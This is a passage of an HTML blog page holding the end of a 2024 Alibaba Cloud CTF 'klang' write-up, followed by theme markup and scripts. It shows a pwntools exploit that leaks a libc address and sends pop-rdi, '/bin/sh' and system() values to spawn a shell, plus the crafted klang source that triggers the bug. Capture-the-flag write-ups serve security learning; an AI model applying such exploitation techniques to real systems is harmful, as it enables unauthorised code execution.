class="hljs-keyword">as</span> file:<br>    content=file.read()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me your code, ended by a line with \&#x27;END_OF_SNIPPET\&#x27; (excluding quote).&#x27;</span>,content.encode())<br>p.sendline(<span class="hljs-string">b&#x27;END_OF_SNIPPET&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>rdi=<span class="hljs-number">0x4018c3</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x404098</span><br>p.recvline()<br>libcbase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>].decode())-<span class="hljs-number">0xe2d9b</span><br>p.sendline(<span class="hljs-built_in">str</span>(rdi).encode())<br>p.sendline(<span class="hljs-built_in">str</span>(binsh).encode())<br>p.sendline(<span class="hljs-built_in">str</span>(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]).encode())<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>exp.klang</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d -&gt; <span class="hljs-type">int</span><br>&#123;<br>	leak_libc(<span class="hljs-number">123</span>, <span class="hljs-number">456</span>);<br>	a := inputi();<br>	b := inputi();<br>	c := inputi();<br>	d := inputi();<br>	prints(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>	<span class="hljs-keyword">do</span><br>	&#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-keyword">while</span>(inputi());<br>	a := dup(a);<br>	b := dup(b);<br>	c := dup(c);<br>	d := dup(d);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">leak_libc</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> :  <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d-&gt; <span class="hljs-type">int</span><br>&#123;<br>	c := a + <span class="hljs-number">1</span>;<br>	printi(c);<br>	<span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>	&#123;<br>		d := a + <span class="hljs-number">1</span>;<br>	&#125;;<br>	<span class="hljs-keyword">return</span> d;	<br>&#125;<br><br>function <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br>	<span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/WP/" class="category-chain-item">WP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2024 阿里云CTF klang wp</div>
+      <div>http://akaieurus.github.io/2024/03/30/阿里云klang/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/" title="2024 阿里云CTF BadApple wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2024 阿里云CTF BadApple wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" title="《UEFI原理与编程》读书笔记">
+                        <span class="hidden-mobile">《UEFI原理与编程》读书笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
